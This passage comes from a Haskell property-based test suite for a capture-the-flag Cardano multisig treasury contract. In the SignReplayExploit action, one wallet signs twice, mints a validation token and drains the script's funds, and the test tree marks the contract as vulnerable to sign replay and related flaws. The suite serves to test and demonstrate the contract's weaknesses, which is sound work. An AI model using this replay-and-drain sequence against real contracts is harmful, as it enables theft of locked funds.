    | -- \^ Mint a validation token
      UseMultisigV3
    | -- \^ Use the multisig (release funds with token burn)
      SignReplayExploit
    -- \^ EXPLOIT: w1 signs twice and drains
    deriving stock (Show, Eq)

  initialState =
    MultisigV3Model
      { mmv3Initialized = False
      , mmv3TxIn = Nothing
      , mmv3Value = 0
      , mmv3RequiredSigners = []
      , mmv3SignedUsers = []
      , mmv3Beneficiary = Nothing
      , mmv3ReleaseValue = 0
      , mmv3HasBeenUsed = False
      , mmv3HasValidationToken = False
      }

  -- Generate actions based on state
  -- Init actions: TIGHT - only generate when not initialized
  -- Non-init actions: BROAD - generate all variants for negative testing
  arbitraryAction model
    | mmv3HasBeenUsed model =
        QC.frequency
          [ (1, SignMultisigV3 <$> QC.elements [Signer1, Signer2]) -- Invalid: used
          , (1, pure MintValidationToken) -- Valid: mint works independently
          , (1, pure UseMultisigV3) -- Invalid: used
          , (1, pure SignReplayExploit) -- Invalid: used
          ]
    | not (mmv3Initialized model) && not (mmv3HasBeenUsed model) = pure InitMultisigV3
    | length (mmv3SignedUsers model) < 2 =
        QC.frequency
          [ (70, SignMultisigV3 <$> pickSigner model)
          , (10, pure SignReplayExploit) -- Exploit: replay signature
          , (10, pure MintValidationToken)
          , (10, pure UseMultisigV3) -- May be invalid: needs token
          ]
    | not (mmv3HasValidationToken model) =
        QC.frequency
          [ (80, pure MintValidationToken)
          , (20, pure UseMultisigV3) -- Invalid: no token yet
          ]
    | otherwise =
        QC.frequency
          [ (90, pure UseMultisigV3)
          , (10, pure MintValidationToken) -- Invalid: already has token
          ]
   where
    pickSigner m
      | walletPkhBytes Wallet.w1 `notElem` mmv3SignedUsers m = pure Signer1
      | walletPkhBytes Wallet.w2 `notElem` mmv3SignedUsers m = pure Signer2
      | otherwise = QC.elements [Signer1, Signer2]

  precondition model InitMultisigV3 = not (mmv3Initialized model) && not (mmv3HasBeenUsed model)
  precondition model (SignMultisigV3 _) = mmv3Initialized model && not (mmv3HasBeenUsed model)
  precondition model MintValidationToken = not (mmv3HasValidationToken model)
  precondition model UseMultisigV3 =
    mmv3Initialized model && not (null (mmv3SignedUsers model)) && mmv3HasValidationToken model
  precondition model SignReplayExploit =
    mmv3Initialized model && not (mmv3HasBeenUsed model)

  nextState model action = case action of
    InitMultisigV3 ->
      model
        { mmv3Initialized = True
        , mmv3TxIn = Just (C.TxIn dummyTxId (C.TxIx 0))
        , mmv3Value = 20_000_000
        , mmv3RequiredSigners = [walletPkhBytes Wallet.w1, walletPkhBytes Wallet.w2]
        , mmv3SignedUsers = []
        , mmv3Beneficiary = Just (walletPlutusAddress Wallet.w1)
        , mmv3ReleaseValue = 10_000_000
        , mmv3HasBeenUsed = False
        , mmv3HasValidationToken = False
        }
    SignMultisigV3 sc ->
      model
        { mmv3SignedUsers = walletPkhBytes (signerToWallet sc) : mmv3SignedUsers model
        }
    MintValidationToken ->
      model
        { mmv3HasValidationToken = True
        }
    UseMultisigV3 ->
      model
        { mmv3Initialized = False
        , mmv3TxIn = Nothing
        , mmv3Value = 0
        , mmv3RequiredSigners = []
        , mmv3SignedUsers = []
        , mmv3Beneficiary = Nothing
        , mmv3ReleaseValue = 0
        , mmv3HasBeenUsed = True
        , mmv3HasValidationToken = False
        }
    SignReplayExploit ->
      -- Exploit: w1 signs twice and drains
      model
        { mmv3Initialized = False
        , mmv3TxIn = Nothing
        , mmv3Value = 0
        , mmv3RequiredSigners = []
        , mmv3SignedUsers = []
        , mmv3Beneficiary = Nothing
        , mmv3ReleaseValue = 0
        , mmv3HasBeenUsed = True
        , mmv3HasValidationToken = False
        }

  perform _model action = case action of
    InitMultisigV3 -> do
      let txBody = execBuildTx $ initMultisigV3 @C.ConwayEra Defaults.networkId Wallet.w1 20_000_000
      runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
        Left err -> fail $ "Failed to initialize multisig v3: " ++ show err
        Right _ -> pure ()
    SignMultisigV3 sc -> do
      let w = signerToWallet sc
      result <- findMultisigV3Utxos
      case result of
        [] -> fail "No UTxO found at multisig v3 script address"
        ((txIn, value, datum) : _) -> do
          let txBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn datum value w
          runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
            Left err -> fail $ "Failed to sign multisig v3: " ++ show err
            Right _ -> pure ()
    MintValidationToken -> do
      let w1Addr = addressInEra Defaults.networkId Wallet.w1
          txBody = execBuildTx $ mintValidationTokenV3WithCollateral @C.ConwayEra w1Addr Wallet.w1
      runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
        Left err -> fail $ "Failed to mint validation token: " ++ show err
        Right _ -> pure ()
    UseMultisigV3 -> do
      result <- findMultisigV3Utxos
      case result of
        [] -> fail "No UTxO found at multisig v3 script address for use"
        ((txIn, _, datum) : _) -> do
          let signer =
                if walletPkhBytes Wallet.w1 `elem` mv3SignedUsers datum
                  then Wallet.w1
                  else Wallet.w2
              beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
              releaseVal = fromInteger (mv3ReleaseValue datum) :: C.Lovelace
              txBody = execBuildTx $ useMultisigV3 @C.ConwayEra txIn beneficiaryAddr releaseVal signer
          runExceptT (balanceAndSubmit mempty Wallet.w1 txBody TrailingChange []) >>= \case
            Left err -> fail $ "Failed to use multisig v3: " ++ show err
            Right _ -> pure ()
    SignReplayExploit -> do
      -- w1 signs twice
      result1 <- findMultisigV3Utxos
      case result1 of
        [] -> fail "No UTxO found for sign replay"
        ((txIn1, value1, datum1) : _) -> do
          -- First sign
          let sign1TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn1 datum1 value1 Wallet.w1
          runExceptT (balanceAndSubmit mempty Wallet.w1 sign1TxBody TrailingChange []) >>= \case
            Left err -> fail $ "Sign replay first sign failed: " ++ show err
            Right _ -> pure ()

          -- Second sign (replay!)
          result2 <- findMultisigV3Utxos
          case result2 of
            [] -> fail "No UTxO after first sign"
            ((txIn2, value2, datum2) : _) -> do
              let sign2TxBody = execBuildTx $ signMultisigV3 @C.ConwayEra Defaults.networkId txIn2 datum2 value2 Wallet.w1
              runExceptT (balanceAndSubmit mempty Wallet.w1 sign2TxBody TrailingChange []) >>= \case
                Left err -> fail $ "Sign replay second sign failed: " ++ show err
                Right _ -> pure ()

              -- Mint token (with collateral output)
              let w1Addr = addressInEra Defaults.networkId Wallet.w1
                  mintTxBody = execBuildTx $ mintValidationTokenV3WithCollateral @C.ConwayEra w1Addr Wallet.w1
              runExceptT (balanceAndSubmit mempty Wallet.w1 mintTxBody TrailingChange []) >>= \case
                Left err -> fail $ "Sign replay mint failed: " ++ show err
                Right _ -> pure ()

              -- Drain
              result3 <- findMultisigV3Utxos
              case result3 of
                [] -> fail "No UTxO after minting"
                ((txIn3, _, _) : _) -> do
                  let beneficiaryAddr = addressInEra Defaults.networkId Wallet.w1
                      useTxBody = execBuildTx $ useMultisigV3 @C.ConwayEra txIn3 beneficiaryAddr 10_000_000 Wallet.w1
                  runExceptT (balanceAndSubmit mempty Wallet.w1 useTxBody TrailingChange []) >>= \case
                    Left err -> fail $ "Sign replay use failed: " ++ show err
                    Right _ -> pure ()

  validate _model = pure True

  monitoring _state _action prop = prop

  -- Note: threatModels empty for same reasons as v1/v2
  threatModels = []

-- ----------------------------------------------------------------------------
-- Test tree
-- ----------------------------------------------------------------------------

-- | All CTF Multisig Treasury V3 tests grouped together
aikenMultisigTreasuryV3Tests :: RunOptions -> TestTree
aikenMultisigTreasuryV3Tests runOpts =
  testGroup
    "ctf multisig_treasury_v3"
    [ aikenMultisigV3UnitTests
    , testGroup
        "property tests"
        [ propRunActionsWithOptions @MultisigV3Model
            "property-based testing"
            runOpts{disableNegativeTesting = Just "CTF vulnerability: sign replay allows duplicate signatures and unauthorized validation token minting"}
        , testProperty
            "vulnerable to sign replay (duplicate signatures)"
            (propMultisigV3SignReplayExploit runOpts)
        , testProperty
            "vulnerable to unprotected script output (expectFailure)"
            (propMultisigV3UnprotectedOutput runOpts)
        , testProperty
            "vulnerable to duplicate list entry (expectFailure)"
            (propMultisigV3VulnerableToDuplicateListEntry runOpts)
        ]
    ]
